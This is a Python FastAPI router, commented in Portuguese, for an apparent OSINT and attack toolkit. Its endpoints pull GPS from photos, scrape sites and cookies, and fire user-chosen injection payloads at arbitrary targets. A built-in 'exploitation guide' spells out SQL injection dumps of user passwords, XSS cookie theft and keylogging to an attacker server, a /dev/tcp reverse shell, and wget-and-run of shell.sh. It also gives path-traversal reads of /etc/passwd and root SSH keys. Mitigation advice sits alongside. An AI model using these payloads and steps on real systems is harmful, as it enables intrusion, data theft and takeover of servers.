from fastapi import APIRouter, UploadFile, File, HTTPException
from fastapi.responses import JSONResponse
import requests
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS
import io
from datetime import datetime
import base64
import aiohttp
import asyncio
from bs4 import BeautifulSoup
from typing import List, Dict
from security_middleware import validate_url_input, security_validator

router = APIRouter()

# 🛡️ Tamanho máximo de arquivo (10MB)
MAX_FILE_SIZE = 10 * 1024 * 1024

def extract_exif(image_data):
    """Extract EXIF data from image"""
    try:
        image = Image.open(io.BytesIO(image_data))
        exif_data = {}
        
        exif = image._getexif()
        if not exif:
            return {"error": "No EXIF data found"}
        
        # Extract basic info
        for tag_id, value in exif.items():
            tag = TAGS.get(tag_id, tag_id)
            
            # Handle GPS data
            if tag == "GPSInfo":
                gps_data = {}
                for gps_tag_id, gps_value in value.items():
                    gps_tag = GPSTAGS.get(gps_tag_id, gps_tag_id)
                    gps_data[gps_tag] = gps_value
                
                # Convert GPS to decimal degrees
                if "GPSLatitude" in gps_data and "GPSLongitude" in gps_data:
                    lat = gps_data["GPSLatitude"]
                    lon = gps_data["GPSLongitude"]
                    
                    lat_deg = float(lat[0]) + float(lat[1])/60 + float(lat[2])/3600
                    lon_deg = float(lon[0]) + float(lon[1])/60 + float(lon[2])/3600
                    
                    if gps_data.get("GPSLatitudeRef") == "S":
                        lat_deg = -lat_deg
                    if gps_data.get("GPSLongitudeRef") == "W":
                        lon_deg = -lon_deg
                    
                    exif_data["gps"] = {
                        "lat": round(lat_deg, 6),
                        "lng": round(lon_deg, 6)
                    }
            else:
                exif_data[tag] = str(value)
        
        return exif_data
    except Exception as e:
        return {"error": str(e)}

@router.post("/extract-exif")
async def extract_exif_endpoint(file: UploadFile = File(...)):
    """Extract EXIF metadata from uploaded image with security validation"""
    try:
        # 🛡️ Validar tipo de arquivo
        allowed_types = ["image/jpeg", "image/jpg", "image/png", "image/gif", "image/bmp", "image/tiff"]
        if file.content_type not in allowed_types:
            raise HTTPException(status_code=400, detail=f"Tipo de arquivo não permitido: {file.content_type}")
        
        # 🛡️ Validar nome do arquivo
        is_valid, error = security_validator.validate_filename(file.filename)
        if not is_valid:
            raise HTTPException(status_code=400, detail=error)
        
        # 🛡️ Validar tamanho
        contents = await file.read()
        if len(contents) > MAX_FILE_SIZE:
            raise HTTPException(status_code=400, detail=f"Arquivo muito grande (máximo {MAX_FILE_SIZE / 1024 / 1024}MB)")
        
        exif_data = extract_exif(contents)
        
        # Get image basic info
        image = Image.open(io.BytesIO(contents))
        
        result = {
            "camera": exif_data.get("Model", "Unknown"),
            "date": exif_data.get("DateTime", "Unknown"),
            "gps": exif_data.get("gps", {"lat": None, "lng": None}),
            "settings": {
                "iso": exif_data.get("ISOSpeedRatings", "Unknown"),
                "aperture": exif_data.get("FNumber", "Unknown"),
                "shutter": exif_data.get("ExposureTime", "Unknown"),
                "focal": exif_data.get("FocalLength", "Unknown")
            },
            "software": exif_data.get("Software", "Unknown"),
            "resolution": f"{image.width} x {image.height}",
            "size": f"{len(contents) / 1024:.2f} KB",
            "format": image.format
        }
        
        return result
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@router.post("/clone-website")
async def clone_website(data: dict):
    """Clone website HTML with security validation"""
    try:
        url = data.get("url")
        if not url:
            raise HTTPException(status_code=400, detail="URL is required")
        
        # 🛡️ Validar URL contra payloads maliciosos
        validated_url = validate_url_input(url)
        
        # Fetch the website
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        # 🛡️ Timeout de 10 segundos para evitar requisições longas
        response = requests.get(validated_url, headers=headers, timeout=10)
        response.raise_for_status()
        
        # 🛡️ Limitar tamanho da resposta (5MB)
        max_response_size = 5 * 1024 * 1024
        if len(response.content) > max_response_size:
            raise HTTPException(status_code=400, detail="Website content too large (max 5MB)")
        
        return {
            "html": response.text,
            "status": response.status_code,
            "size": len(response.text)
        }
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@router.post("/analyze-face")
async def analyze_face(file: UploadFile = File(...)):
    """Analyze face in image with security validation"""
    try:
        # 🛡️ Validar tipo de arquivo
        allowed_types = ["image/jpeg", "image/jpg", "image/png", "image/gif"]
        if file.content_type not in allowed_types:
            raise HTTPException(status_code=400, detail=f"Tipo de arquivo não permitido: {file.content_type}")
        
        # 🛡️ Validar tamanho
        contents = await file.read()
        if len(contents) > MAX_FILE_SIZE:
            raise HTTPException(status_code=400, detail=f"Arquivo muito grande (máximo {MAX_FILE_SIZE / 1024 / 1024}MB)")
        
        image = Image.open(io.BytesIO(contents))
        
        # This would integrate with face-api.js or similar
        # For now, return structure for frontend to use
        return {
            "faces": 1,
            "width": image.width,
            "height": image.height,
            "format": image.format
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@router.post("/reverse-image-search")
async def reverse_image_search(data: dict):
    """Perform reverse image search across multiple engines and return aggregated results"""
    try:
        image_url = data.get("imageUrl")
        if not image_url:
            raise HTTPException(status_code=400, detail="Image URL is required")
        
        engines = [
            {
                "name": "Google Images",
                "url": f"https://images.google.com/searchbyimage?image_url={image_url}",
                "search_url": f"https://www.google.com/searchbyimage?image_url={image_url}&encoded_image=&image_content=&filename=&hl=en"
            },
            {
                "name": "Yandex Images", 
                "url": f"https://yandex.com/images/search?rpt=imageview&url={image_url}",
                "search_url": f"https://yandex.com/images/search?rpt=imageview&url={image_url}"
            },
            {
                "name": "Bing Images",
                "url": f"https://www.bing.com/images/search?view=detailv2&iss=sbi&form=SBIIRP&sbisrc=UrlPaste&q=imgurl:{image_url}",
                "search_url": f"https://www.bing.com/images/search?view=detailv2&iss=sbi&form=SBIIRP&sbisrc=UrlPaste&q=imgurl:{image_url}"
            },
            {
                "name": "TinEye",
                "url": f"https://tineye.com/search?url={image_url}",
                "search_url": f"https://tineye.com/search?url={image_url}"
            }
        ]
        
        async def fetch_engine_results(session: aiohttp.ClientSession, engine: Dict) -> Dict:
            """Fetch results from a single search engine"""
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                }
                
                async with session.get(engine["search_url"], headers=headers, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                    if response.status == 200:
                        html = await response.text()
                        
                        # Parse results based on engine
                        results_found = 0
                        snippet = ""
                        
                        if engine["name"] == "Google Images":
                            if "Best guess for this image" in html or "Pages that include matching images" in html:
                                results_found = html.count('<div class="g">')
                                soup = BeautifulSoup(html, 'html.parser')
                                guess = soup.find(string=lambda text: text and "Best guess" in text)
                                if guess:
                                    snippet = guess.strip()[:200]
                        
                        elif engine["name"] == "Yandex Images":
                            if "Similar images" in html or "Sites" in html:
                                results_found = html.count('serp-item')
                        
                        elif engine["name"] == "Bing Images":
                            if "Image results" in html or "Related" in html:
                                results_found = html.count('iusc')
                        
                        elif engine["name"] == "TinEye":
                            soup = BeautifulSoup(html, 'html.parser')
                            match_count = soup.find(class_='matches')
                            if match_count:
                                text = match_count.get_text()
                                import re
                                numbers = re.findall(r'\d+', text)
                                if numbers:
                                    results_found = int(numbers[0])
                        
                        return {
                            "engine": engine["name"],
                            "status": "success",
                            "results_found": results_found if results_found > 0 else "Unknown",
                            "url": engine["search_url"],
                            "snippet": snippet if snippet else "Resultados encontrados",
                            "available": results_found > 0 or "Similar" in html or "match" in html.lower()
                        }
                    else:
                        return {
                            "engine": engine["name"],
                            "status": "error",
                            "results_found": 0,
                            "url": engine["search_url"],
                            "snippet": f"HTTP {response.status}",
                            "available": False
                        }
            except asyncio.TimeoutError:
                return {
                    "engine": engine["name"],
                    "status": "timeout",
                    "results_found": 0,
                    "url": engine["search_url"],
                    "snippet": "Timeout ao buscar resultados",
                    "available": False
                }
            except Exception as e:
                return {
                    "engine": engine["name"],
                    "status": "error",
                    "results_found": 0,
                    "url": engine["search_url"],
                    "snippet": str(e)[:100],
                    "available": False
                }
        
        # Fetch all engines in parallel
        async with aiohttp.ClientSession() as session:
            tasks = [fetch_engine_results(session, engine) for engine in engines]
            results = await asyncio.gather(*tasks)
        
        return {
            "imageUrl": image_url,
            "engines": results,
            "totalEngines": len(engines),
            "successfulSearches": sum(1 for r in results if r["available"])
        }
        
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))



@router.post("/exploit-tester")
async def exploit_tester(data: dict):
    """Teste automatizado de exploração com múltiplos payloads selecionados pelo usuário"""
    try:
        target = data.get("target")
        payloads = data.get("payloads", [])
        mode = data.get("mode", "custom")
        
        # 🛡️ Validar URL do target
        validated_target = validate_url_input(target)
        
        # Se payloads for lista vazia ou None, tentar pegar payload único (retrocompatibilidade)
        if not payloads:
            single_payload = data.get("payload")
            if single_payload:
                payloads = [single_payload]
        
        if not payloads or len(payloads) == 0:
            raise HTTPException(status_code=400, detail="Pelo menos 1 payload é obrigatório")
        if not payloads or len(payloads) == 0:
            raise HTTPException(status_code=400, detail="Pelo menos 1 payload é obrigatório")
        
        # 🛡️ Limitar número de payloads (max 50 para não sobrecarregar)
        if len(payloads) > 50:
            raise HTTPException(status_code=400, detail="Máximo de 50 payloads por teste")
        
        # Resultados agregados
        all_results = []
        vulnerable_payloads = []
        exploit_types_detected = set()
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        # Testar cada payload fornecido pelo usuário
        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                # Detectar tipo de exploit
                exploit_type = detect_exploit_type(payload)
                exploit_types_detected.add(exploit_type)
                
                try:
                    start_time = asyncio.get_event_loop().time()
                    
                    # Testar GET com payload
                    test_url = f"{validated_target}?test={payload}"
                    async with session.get(test_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
                        response_time = int((asyncio.get_event_loop().time() - start_time) * 1000)
                        content = await response.text()
                        
                        # Análise de vulnerabilidade
                        is_vulnerable = analyze_vulnerability(payload, content, response.status, exploit_type)
                        
                        if is_vulnerable:
                            vulnerable_payloads.append(payload)
                        
                        all_results.append({
                            "payload": payload,
                            "exploitType": exploit_type,
                            "method": "GET",
                            "status": response.status,
                            "responseTime": response_time,
                            "vulnerable": is_vulnerable,
                            "responseLength": len(content)
                        })
                except Exception as e:
                    all_results.append({
                        "payload": payload,
                        "exploitType": exploit_type,
                        "method": "GET",
                        "status": 0,
                        "responseTime": 0,
                        "vulnerable": False,
                        "error": str(e)[:100]
                    })
        
        # Análise final
        vulnerable = len(vulnerable_payloads) > 0
        
        if vulnerable:
            # Pegar tipo de exploit mais comum
            main_exploit_type = max(exploit_types_detected, key=lambda x: sum(1 for r in all_results if r.get('exploitType') == x and r.get('vulnerable')))
            confidence = calculate_confidence(all_results)
            mitigation = generate_mitigation(main_exploit_type)
            
            return {
                "vulnerable": True,
                "exploitTypes": list(exploit_types_detected),
                "mainExploitType": main_exploit_type,
                "confidence": confidence,
                "totalTested": len(payloads),
                "vulnerableCount": len(vulnerable_payloads),
                "analysis": f"⚠️ SISTEMA VULNERÁVEL! Detectadas {len(vulnerable_payloads)} vulnerabilidades de {len(payloads)} payloads testados. "
                           f"Tipos de ataque detectados: {', '.join(exploit_types_detected)}. "
                           f"Confiança: {confidence}%.",
                "vulnerablePayloads": vulnerable_payloads,
                "allResults": all_results,
                "mitigation": mitigation
            }
        else:
            return {
                "vulnerable": False,
                "exploitTypes": list(exploit_types_detected),
                "totalTested": len(payloads),
                "vulnerableCount": 0,
                "analysis": f"✓ Sistema testado com {len(payloads)} payloads diferentes. "
                           f"Tipos testados: {', '.join(exploit_types_detected)}. "
                           f"Nenhuma vulnerabilidade foi detectada. O sistema parece estar protegido.",
                "allResults": all_results,
                "message": "Sistema aparentemente seguro contra os ataques testados."
            }
            
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


def detect_exploit_type(payload: str) -> str:
    """Detecta automaticamente o tipo de exploit baseado no payload"""
    payload_lower = payload.lower()
    
    if "'" in payload or "or" in payload_lower or "union" in payload_lower or "select" in payload_lower:
        return "SQL Injection"
    elif "<script" in payload_lower or "alert(" in payload_lower or "onerror" in payload_lower:
        return "XSS (Cross-Site Scripting)"
    elif ";" in payload or "|" in payload or "&" in payload or "`" in payload:
        return "Command Injection"
    elif "../" in payload or "..%2f" in payload_lower or "etc/passwd" in payload_lower:
        return "LFI/Path Traversal"
    elif "{{" in payload or "${" in payload or "<%=" in payload:
        return "SSTI (Template Injection)"
    else:
        return "Generic Injection"


def generate_payload_variations(payload: str, exploit_type: str) -> list:
    """Gera variações inteligentes do payload baseado no tipo"""
    variations = [payload]
    
    if exploit_type == "SQL Injection":
        variations.extend([
            payload,
            payload.replace("'", '"'),
            payload + " --",
            payload + " #",
            payload + "/*",
            f"admin{payload}",
            f"1{payload}",
            payload.replace(" ", "/**/"),
            payload.upper(),
            payload.lower()
        ])
    elif exploit_type == "XSS (Cross-Site Scripting)":
        variations.extend([
            payload,
            payload.replace("<", "%3C").replace(">", "%3E"),
            payload.replace("script", "ScRiPt"),
            f'"><script>alert(1)</script>',
            f"'><script>alert(1)</script>",
            f'<img src=x onerror={payload.replace("<script>", "").replace("</script>", "")}>',
            f'<svg/onload={payload.replace("<script>", "").replace("</script>", "")}>',
        ])
    elif exploit_type == "Command Injection":
        variations.extend([
            payload,
            f"; {payload}",
            f"| {payload}",
            f"& {payload}",
            f"&& {payload}",
            f"|| {payload}",
            f"`{payload}`",
            f"$({payload})",
        ])
    
    return list(set(variations))[:10]  # Limitar a 10 variações


def analyze_vulnerability(payload: str, response: str, status: int, exploit_type: str) -> bool:
    """Analisa se a resposta indica vulnerabilidade"""
    response_lower = response.lower()
    
    if exploit_type == "SQL Injection":
        sql_indicators = [
            "sql syntax", "mysql", "postgresql", "ora-", "microsoft sql",
            "unclosed quotation", "syntax error", "database error",
            "warning: mysql", "error in your sql", "sqlite_error"
        ]
        return any(indicator in response_lower for indicator in sql_indicators)
    
    elif exploit_type == "XSS (Cross-Site Scripting)":
        # Verifica se o payload foi refletido sem sanitização
        return payload in response or payload.replace("<", "&lt;") not in response
    
    elif exploit_type == "Command Injection":
        cmd_indicators = [
            "root:", "/bin/bash", "uid=", "gid=", "sh:", 
            "command not found", "permission denied"
        ]
        return any(indicator in response_lower for indicator in cmd_indicators)
    
    elif exploit_type == "LFI/Path Traversal":
        lfi_indicators = [
            "root:x:", "/etc/passwd", "bin/bash", "nobody:",
            "failed to open stream", "no such file"
        ]
        return any(indicator in response_lower for indicator in lfi_indicators)
    
    return False


def calculate_confidence(results: list) -> int:
    """Calcula confiança baseado nos resultados"""
    vulnerable_count = sum(1 for r in results if r.get('vulnerable', False))
    total = len(results)
    
    if vulnerable_count == 0:
        return 0
    
    base_confidence = int((vulnerable_count / total) * 100)
    
    # Ajustar baseado em múltiplos indicadores
    if vulnerable_count > 3:
        base_confidence = min(95, base_confidence + 10)
    
    return base_confidence


def generate_exploitation_guide(exploit_type: str, target: str, payload: str) -> dict:
    """Gera guia de exploração automatizado"""
    guides = {
        "SQL Injection": {
            "guide": "SQL Injection permite extrair, modificar ou deletar dados do banco de dados. "
                    "Você pode usar UNION SELECT para extrair dados de outras tabelas.",
            "steps": [
                f"1. Use o payload: {payload} para confirmar a injeção",
                "2. Descubra o número de colunas: ' ORDER BY 1-- (aumente até dar erro)",
                "3. Use UNION SELECT NULL,NULL,... com o número correto de colunas",
                "4. Identifique colunas visíveis: UNION SELECT 1,2,3,...",
                "5. Extraia dados: ' UNION SELECT username,password FROM users--",
                "6. Use information_schema para mapear o banco: ' UNION SELECT table_name FROM information_schema.tables--"
            ]
        },
        "XSS (Cross-Site Scripting)": {
            "guide": "XSS permite executar JavaScript no navegador da vítima. "
                    "Você pode roubar cookies, redirecionar usuários, ou modificar a página.",
            "steps": [
                f"1. Injete o payload: {payload}",
                "2. Para roubar cookies: <script>fetch('//seu-server.com?c='+document.cookie)</script>",
                "3. Para keylogging: <script>document.onkeypress=function(e){fetch('//seu-server.com?k='+e.key)}</script>",
                "4. Para phishing: <script>document.body.innerHTML='<h1>Login</h1>....'</script>",
                "5. Persistente: Armazene em banco se refletido em múltiplas páginas"
            ]
        },
        "Command Injection": {
            "guide": "Command Injection permite executar comandos do sistema operacional no servidor. "
                    "Você pode listar arquivos, ler dados sensíveis, ou obter shell reverso.",
            "steps": [
                f"1. Teste básico: {payload}",
                "2. Liste diretórios: ; ls -la",
                "3. Leia arquivos: ; cat /etc/passwd",
                "4. Shell reverso: ; bash -i >& /dev/tcp/SEU_IP/4444 0>&1",
                "5. Baixe ferramentas: ; wget http://seu-server.com/shell.sh",
                "6. Execute: ; chmod +x shell.sh && ./shell.sh"
            ]
        },
        "LFI/Path Traversal": {
            "guide": "LFI permite ler arquivos arbitrários do servidor. "
                    "Pode expor código-fonte, credenciais, chaves SSH, etc.",
            "steps": [
                f"1. Teste básico: {payload}",
                "2. Leia passwd: ../../../../etc/passwd",
                "3. Leia configurações: ../../../../etc/config/database.yml",
                "4. Código-fonte: ../../../../var/www/html/index.php",
                "5. Logs: ../../../../var/log/apache2/access.log",
                "6. Chaves SSH: ../../../../root/.ssh/id_rsa"
            ]
        }
    }
    
    return guides.get(exploit_type, {
        "guide": "Exploit genérico detectado. Analise a resposta do servidor para determinar o impacto.",
        "steps": ["1. Analise as respostas", "2. Teste variações", "3. Documente achados"]
    })


def generate_mitigation(exploit_type: str) -> str:
    """Gera recomendações de correção"""
    mitigations = {
        "SQL Injection": """
        ✓ Use prepared statements/parameterized queries (NUNCA concatene SQL)
        ✓ Use ORM (SQLAlchemy, Django ORM, etc) que escapa automaticamente
        ✓ Valide e sanitize TODAS as entradas do usuário
        ✓ Use least privilege: banco com permissões mínimas
        ✓ Desabilite mensagens de erro detalhadas em produção
        ✓ Implemente WAF (Web Application Firewall)
        """,
        "XSS (Cross-Site Scripting)": """
        ✓ Escape TODA saída HTML usando funções apropriadas (htmlspecialchars, DOMPurify)
        ✓ Use Content Security Policy (CSP) headers
        ✓ Valide entrada no servidor (whitelist de caracteres)
        ✓ Use frameworks que escapam automaticamente (React, Vue)
        ✓ Set HttpOnly e Secure flags em cookies
        ✓ Implemente X-XSS-Protection header
        """,
        "Command Injection": """
        ✓ NUNCA execute comandos do sistema com input do usuário
        ✓ Use bibliotecas nativas ao invés de shell (subprocess.run com shell=False)
        ✓ Whitelist de comandos permitidos
        ✓ Valide e sanitize RIGOROSAMENTE qualquer input
        ✓ Execute com usuário de menor privilégio possível
        ✓ Use containers/sandboxing para isolar execução
        """,
        "LFI/Path Traversal": """
        ✓ NUNCA use input do usuário diretamente em caminhos de arquivo
        ✓ Use whitelist de arquivos permitidos
        ✓ Valide paths com realpath() e verifique se está no diretório permitido
        ✓ Remova ../ e caracteres especiais
        ✓ Use chroot jail ou containers
        ✓ Desabilite allow_url_include no PHP
        """
    }
    
    return mitigations.get(exploit_type, "Implemente validação rigorosa de entrada e princípio do menor privilégio.")

@router.post("/extract-cookies")
async def extract_cookies(data: dict):
    """Extrai cookies e cabeçalhos de segurança de uma URL"""
    try:
        url = data.get("url")
        if not url:
            raise HTTPException(status_code=400, detail="URL é obrigatória")
        
        # Validate URL
        validated_url = validate_url_input(url)
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        
        async with aiohttp.ClientSession(cookie_jar=aiohttp.DummyCookieJar()) as session:
            # allow_redirects=True to follow redirects and gather more cookies
            async with session.get(validated_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), ssl=False, allow_redirects=True) as response:
                
                # Extrair cookies do objeto de resposta (Set-Cookie headers processados)
                cookies_list = []
                for cookie_name, cookie_morsel in response.cookies.items():
                    cookies_list.append({
                        "name": cookie_name,
                        "value": cookie_morsel.value,
                        "domain": cookie_morsel.get('domain', ''),
                        "path": cookie_morsel.get('path', '/'),
                        "secure": cookie_morsel.get('secure', False),
                        "httponly": cookie_morsel.get('httponly', False),
                        "samesite": cookie_morsel.get('samesite', 'None'),
                        "expires": cookie_morsel.get('expires', '')
                    })
                    
                # Extrair Cabeçalhos Relevantes
                relevant_headers = {}
                security_headers = [
                    'server', 'x-powered-by', 'strict-transport-security', 
                    'content-security-policy', 'x-frame-options', 'x-content-type-options',
                    'x-xss-protection', 'access-control-allow-origin'
                ]
                
                for key, val in response.headers.items():
                    if key.lower() in security_headers or key.lower().startswith('x-'):
                        relevant_headers[key] = val
                
                server_name = response.headers.get('Server', 'Desconhecido')
                
                return {
                    "url": validated_url,
                    "status_code": response.status,
                    "server": server_name,
                    "cookies": cookies_list,
                    "headers": relevant_headers
                }
                
    except asyncio.TimeoutError:
        raise HTTPException(status_code=408, detail="Timeout ao tentar se conectar ao servidor alvo.")
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Erro ao capturar cookies: {str(e)}")

@router.post("/web-scraper")
async def web_scraper(data: dict):
    """Realiza web scraping avançado extraindo HTML, CSS, JS, Imagens, Vídeos, URLs e Cookies"""
    try:
        url = data.get("url")
        if not url:
            raise HTTPException(status_code=400, detail="URL é obrigatória")
        
        validated_url = validate_url_input(url)
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9"
        }
        
        async with aiohttp.ClientSession(cookie_jar=aiohttp.DummyCookieJar()) as session:
            async with session.get(validated_url, headers=headers, timeout=aiohttp.ClientTimeout(total=15), ssl=False, allow_redirects=True) as response:
                
                content_type = response.headers.get('Content-Type', '')
                if 'text/html' not in content_type:
                    raise HTTPException(status_code=400, detail=f"O alvo não retornou HTML. Tipo recebido: {content_type}")
                
                html_content = await response.text()
                soup = BeautifulSoup(html_content, 'html.parser')
                
                # Extract CSS (Inline + External)
                css_links = [link.get('href') for link in soup.find_all('link', rel='stylesheet') if link.get('href')]
                inline_styles = [style.get_text() for style in soup.find_all('style') if style.get_text().strip()]
                
                # Extract JS (Inline + External)
                js_links = [script.get('src') for script in soup.find_all('script') if script.get('src')]
                inline_scripts = [script.get_text() for script in soup.find_all('script') if not script.get('src') and script.get_text().strip()]
                
                # Extract Media (Images, Videos, Audio)
                images = [img.get('src') for img in soup.find_all('img') if img.get('src')]
                videos = [v.get('src') for v in soup.find_all(['video', 'source']) if v.get('src')]
                
                # Extract Links/URLs
                links = []
                for a in soup.find_all('a', href=True):
                    href = a.get('href')
                    if href and not href.startswith('#') and not href.startswith('javascript:'):
                        links.append({
                            "text": a.get_text(strip=True)[:50],
                            "href": href
                        })
                
                # Extract Cookies
                cookies_list = []
                for cookie_name, cookie_morsel in response.cookies.items():
                    cookies_list.append({
                        "name": cookie_name,
                        "value": cookie_morsel.value,
                        "domain": cookie_morsel.get('domain', ''),
                        "path": cookie_morsel.get('path', '/'),
                        "secure": cookie_morsel.get('secure', False),
                        "httponly": cookie_morsel.get('httponly', False)
                    })
                
                from urllib.parse import urljoin
                
                # Format to Absolute URLs helper
                def make_absolute(url_list):
                    return list(set(urljoin(str(response.url), u) for u in url_list))
                
                return {
                    "target_url": str(response.url),
                    "status_code": response.status,
                    "server": response.headers.get('Server', 'Desconhecido'),
                    "cookies": cookies_list,
                    "html": {
                        "content": html_content,
                        "length": len(html_content)
                    },
                    "assets": {
                        "css_files": make_absolute(css_links),
                        "inline_css": inline_styles,
                        "js_files": make_absolute(js_links),
                        "inline_js": inline_scripts,
                        "images": make_absolute(images),
                        "videos": make_absolute(videos)
                    },
                    "links": links
                }
                
    except asyncio.TimeoutError:
        raise HTTPException(status_code=408, detail="Timeout ao carregar a página alvo.")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Falha no Scraping: {str(e)}")
